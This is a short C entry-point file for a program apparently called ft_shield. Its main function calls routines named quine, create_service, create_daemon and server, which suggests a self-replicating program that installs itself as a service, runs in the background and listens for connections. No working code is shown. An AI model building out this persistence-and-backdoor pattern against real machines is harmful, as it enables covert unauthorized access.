# include "ft_shield.h"

int main() {
    quine();
    create_service(SERVICE_NAME, DEST_FILE);
    create_daemon();
    server();
    return (0);
}